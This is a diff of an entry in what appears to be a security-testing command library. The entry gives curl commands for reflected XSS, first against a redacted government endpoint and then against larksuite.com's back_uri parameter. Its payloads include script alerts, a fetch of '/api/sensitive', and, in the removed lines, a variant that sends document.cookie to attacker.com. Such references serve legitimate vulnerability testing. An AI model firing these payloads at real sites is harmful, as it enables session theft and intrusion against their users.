@@ -1,23 +1,19 @@
 ---
-id: c3d4e5f6-g7h8-9012-cdef-345678901234
-data: >-
-  curl -G "https://███████/███████=" --data-urlencode
-  "sub_div_ofc_sym_cd=%3Csvg%2Fonload%3Dalert%28%27nagli%27%29%3E" -v
+data: 'curl "https://larksuite.com/?back_uri=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"'
 tags:
-  - xss
   - web
+  - xss
   - testing
 type: command
-output: >-
-  HTTP response with reflected payload in HTML body, e.g.,
-  ...<svg/onload=alert('nagli')>...</svg>...
+output: null
 executor: bash
 platforms:
   - Linux
   - macOS
   - Windows
-created_at: '2024-01-01T00:00:00Z'
-updated_at: '2025-12-14T03:47:13.062Z'
+created_at: '2023-10-01T00:00:00Z'
+updated_at: '2025-12-14T17:24:31.422Z'
+id: 747a8280-d2fe-45e8-8382-b09936f39093
 verified: false
 validated: true
 submitted: true
@@ -27,41 +23,39 @@ submitted: true
 ## Command
 
 ```bash
-curl -G "https://███████/███████=" --data-urlencode "sub_div_ofc_sym_cd=%3Csvg%2Fonload%3Dalert%28%27nagli%27%29%3E" -v
+curl "https://larksuite.com/?back_uri=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"
 ```
 
 ## Description
 
-This command uses curl to send a GET request to the vulnerable DoD web application endpoint, injecting a URL-encoded JavaScript payload into the 'sub_div_ofc_sym_cd' query parameter. It tests for reflected XSS by checking if the payload is echoed back unsanitized in the response, which would allow execution in a browser context.
+This command tests for reflected XSS by injecting a URL-encoded JavaScript payload into the back_uri parameter and checking if it appears unescaped in the HTML response.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `-G` | Treats the following arguments as GET parameters | Yes |
-| `--data-urlencode` | URL-encodes the data for the query parameter | Yes |
-| `-v` | Verbose output to show request/response details | Yes |
-| `sub_div_ofc_sym_cd` | The vulnerable query parameter name | Yes |
-| Payload value | Encoded JavaScript, e.g., %3Csvg%2Fonload%3Dalert%28%27nagli%27%29%3E | Yes |
+| `back_uri` | URL-encoded payload (e.g., %22%3E%3Cscript%3Ealert(1)%3C/script%3E for "><script>alert(1)</script>) | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-curl -G "https://███████/███████=" --data-urlencode "sub_div_ofc_sym_cd=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" -v
+curl "https://larksuite.com/?back_uri=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E"
 ```
 
 ### Advanced Usage
 
 ```bash
-curl -G "https://███████/███████=" --data-urlencode "sub_div_ofc_sym_cd=%3Csvg%2Fonload%3Dfetch%28%27https%3A%2F%2Fattacker.com%2Fsteal%3Fcookie%3D%27%2Bdocument.cookie%29%3E" --cookie "session=abc123" -v
+curl -s "https://larksuite.com/?back_uri=%22%3E%3Cscript%3Efetch('/api/sensitive')%3C/script%3E" | grep -i script
 ```
+
+> Pipe to grep to check for reflected script tags.
 
 ## Expected Output
 
-Verbose curl output showing the HTTP request with query parameters, followed by the response body containing the reflected payload, such as HTML with `<svg/onload=alert('nagli')>` embedded without escaping. If vulnerable, no errors occur, and the payload is visible in the response.
+HTML response containing the unescaped payload, e.g., ...back_uri="><script>alert(1)</script>... indicating vulnerability.
 
 ## Related
 
-- [[Related Procedure: Exploit-Reflected-XSS-in-sub_div_ofc_sym_cd-Parameter]]
+- [[Related Procedure: Exploit Reflected XSS via back_uri]]
